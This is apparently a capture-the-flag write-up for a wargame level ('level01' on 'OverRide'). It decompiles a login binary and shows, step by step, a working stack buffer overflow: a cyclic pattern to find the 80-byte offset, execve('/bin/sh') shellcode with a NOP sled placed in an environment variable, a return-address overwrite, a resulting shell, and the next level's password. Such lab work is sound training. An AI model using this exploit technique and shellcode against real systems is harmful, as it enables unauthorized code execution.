After decompiling with hex-rays we have something like this:

_BOOL4 verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(a_user_name, "dat_wil", 7u) != 0;
}

//----- (080484A3) --------------------------------------------------------
_BOOL4 __cdecl verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u) != 0;
}

//----- (080484D0) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  _BOOL4 v5; // [esp+5Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  v5 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(a_user_name, 256, stdin);
  v5 = verify_user_name();
  if ( v5 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(s, 100, stdin);
    v5 = verify_user_pass(s);
    puts("nope, incorrect password...\n");
  }
  return 1;
}

So we can enter in the else statement by entering the correct username (dat_will).
Then we can enter the password and it will be compared with "admin".
We can see that the password is stored in a 64 bytes buffer and that the function verify_user_pass() will compare the first 5 bytes of the buffer with "admin".
We can just overflow the buffer of 64 with a pattern (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
and find the offset.


gdb ./level01 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

So the program segfault, like we expected, we put the address of the segfault in the offset string generator and we have the offset :
Offset = 80

Now we can export our shellcode (That we found in Rainfall), in the environment variable SHELLCODEINJECTION and we can use it to overflow the buffer and jump to our shellcode.

export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
level01@OverRide:~$ gdb ./level01 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) x/30s *((char **)environ)
No symbol table is loaded.  Use the "file" command.
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) run
Starting program: /home/users/level01/level01 

Now we have to find the address of our shellcode, we can do it with gdb :

Breakpoint 1, 0x080484d5 in main ()
(gdb) x/30s *((char **)environ)
0xffffd83e:	 "TERM=xterm-256color"
0xffffd852:	 "SHELL=/bin/bash"
0xffffd862:	 "SSH_CLIENT=192.168.56.1 49822 4242"
0xffffd885:	 "SSH_TTY=/dev/pts/0"
0xffffd898:	 "USER=level01"
0xffffd8a5:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xffffd96d:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xffffda35:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xffffdafd:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xffffdbc5:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xffffdc8d:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xffffdd55:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xffffddc6:	 "COLUMNS=134"
0xffffddd2:	 "MAIL=/var/mail/level01"
0xffffdde9:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xffffde36:	 "_=/usr/bin/gdb"
0xffffde45:	 "PWD=/home/users/level01"
0xffffde5d:	 "LANG=en_US.UTF-8"
0xffffde6e:	 "LINES=32"
0xffffde77:	 "SHELLCODEINJECTION=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"
0xffffdf23:	 "SHLVL=2"
---Type <return> to continue, or q <return> to quit---
0xffffdf2b:	 "HOME=/home/users/level01"
0xffffdf44:	 "LANGUAGE=en_US:en"
0xffffdf56:	 "LOGNAME=level01"
0xffffdf66:	 "SSH_CONNECTION=192.168.56.1 49822 192.168.56.4 4242"
0xffffdf9a:	 "LESSOPEN=| /usr/bin/lesspipe %s"
0xffffdfba:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xffffdfdc:	 "/home/users/level01/level01"
0xffffdff8:	 ""
0xffffdff9:	 ""


We convert the address of our shellcode in little endian and we put it in the buffer after the 80 bytes of offset.

0xffffde77 in little endian = \x77\xde\xff\xff

And we create our payload : first we enter the username, then the password (our overflow),
after keep the shell open with cat and pipe this to the level01 binary.

((python -c 'print "dat_will"') ; (python -c 'print "A"*80 + "\x77\xde\xff\xff"') ; cat)

level01@OverRide:~$ ((python -c 'print "dat_will"') ; (python -c 'print "A"*80 + "\x77\xde\xff\xff"') ; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv